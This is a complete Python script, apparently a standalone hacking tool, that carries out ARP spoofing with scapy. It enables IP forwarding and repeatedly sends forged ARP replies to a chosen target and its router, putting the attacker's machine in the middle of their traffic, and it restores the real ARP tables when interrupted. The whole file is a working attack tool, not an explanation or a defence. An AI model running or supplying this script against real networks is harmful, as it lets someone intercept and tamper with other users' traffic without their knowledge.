#!/usr/bin/sudo python3

from scapy.layers.l2 import ARP, Ether, srp
from scapy.all import send
from time import sleep
from os import system
from argparse import ArgumentParser


def get_arguments():
    parser = ArgumentParser()
    parser.add_argument('-t', '--target-ip', dest='target_ip', help='ip of target', required=True)
    parser.add_argument('-r', '--router-ip', dest='router_ip', help='ip of router', required=True)
    args = parser.parse_args()
    return args


def forward_packets():
    system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def no_forward_packet():
    system('echo 0 > /proc/sys/net/ipv4/ip_forward')


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)


args = get_arguments()
forward_packets()
sent_packets_count = 0
t_mac = get_mac(args.target_ip)
r_mac = get_mac(args.router_ip)
try:
    while True:
        spoof(args.target_ip, t_mac, args.router_ip)
        spoof(args.router_ip, r_mac, args.target_ip)
        sent_packets_count += 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        sleep(2)
except KeyboardInterrupt:
    print('\r[-] Detected CTRL + C .... Quiting.')
    no_forward_packet()
    restore(args.target_ip, t_mac, args.router_ip, r_mac)
    restore(args.router_ip, r_mac, args.target_ip, t_mac)
